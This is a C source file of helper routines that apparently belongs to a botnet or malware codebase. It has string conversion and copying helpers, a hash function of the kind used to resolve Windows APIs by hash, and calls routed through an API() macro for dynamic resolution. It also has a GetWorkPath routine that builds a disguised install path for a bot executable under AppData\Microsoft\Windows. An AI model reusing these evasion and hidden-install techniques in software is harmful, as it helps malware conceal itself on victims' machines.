#include "Common.h"

BOOL ASCIIToUnicode(char* utf8, wchar_t* unicode)
{
	if (!utf8)
	{
		return FALSE;
	}

	int strLen = API(KERNEL32, MultiByteToWideChar)(CP_UTF8, 0, utf8, -1, NULL, 0);
	if (!strLen)
	{
		return FALSE;
	}

	API(KERNEL32, MultiByteToWideChar)(CP_UTF8, 0, utf8, -1, unicode, strLen);

	return TRUE;
}

BOOL UnicodeToASCII(wchar_t* utf16, char* ascii)
{
	if (!utf16)
	{
		return FALSE;
	}

	int strLen = API(KERNEL32, WideCharToMultiByte)(CP_UTF8, 0, utf16, -1, NULL, 0, NULL, NULL);
	if (!strLen)
	{
		return FALSE;
	}

	API(KERNEL32, WideCharToMultiByte)(CP_UTF8, 0, utf16, -1, ascii, strLen, NULL, NULL);

	return TRUE;
}

void GetWorkPath(LPWSTR path)
{
	static wchar_t botId[100];
	HANDLE hPath = NULL;

	GetBotId(botId);

	if ((API(SHELL32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, 0, path)) != S_OK)
	{
		// ???
	}

	API(KERNEL32, lstrcatW)(path, L"\\Microsoft\\Windows\\");
	API(KERNEL32, lstrcatW)(path, botId);

	hPath = API(KERNEL32, CreateFileW)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPath == INVALID_HANDLE_VALUE)
	{
		API(KERNEL32, CreateDirectoryW)(path, NULL);
	}

	API(KERNEL32, lstrcatW)(path, L"\\");
	API(KERNEL32, lstrcatW)(path, botId);
	API(KERNEL32, lstrcatW)(path, L".exe");
}


int strCmp(const char* src, const char* dst)
{
	int ret = 0;
	unsigned char* p1 = (unsigned char*)src;
	unsigned char* p2 = (unsigned char*)dst;

	while (!(ret = *p1 - *p2) && *p2)
		++p1, ++p2;
	if (ret < 0)
	{
		ret = -1;
	}
	else if (ret > 0)
	{
		ret = 1;
	}

	return (ret);
}

size_t strLen(LPCSTR str)
{
	if (!str)
	{
		return 0;
	}

	size_t cnt = 0;
	for (; *str != '\0'; ++str)
	{
		++cnt;
	}

	return cnt;
}

char* strCat(char* dest, const char* src)
{
	char* ptr = dest + strLen(dest);

	while (*src != '\0')
		*ptr++ = *src++;

	*ptr = '\0';

	return dest;
}

char* strCpy(char* dest, const char* src)
{
	char* ret = dest;
	while (*src)
	{
		*dest++ = *src++;
	}
	*dest = '\0';
	return ret;
}

unsigned int CalcHash(const byte* ptr, int c_ptr)
{
	unsigned int hash = 0;
	if (ptr && c_ptr > 0)
	{
		for (int i = 0; i < c_ptr; i++, ptr++)
		{
			hash = (hash << 4) + *ptr;
			unsigned t;

			if ((t = hash & 0xf0000000) != 0)
			{
				hash = ((hash ^ (t >> 24)) & (0x0fffffff));
			}
		}
	}
	return hash;
}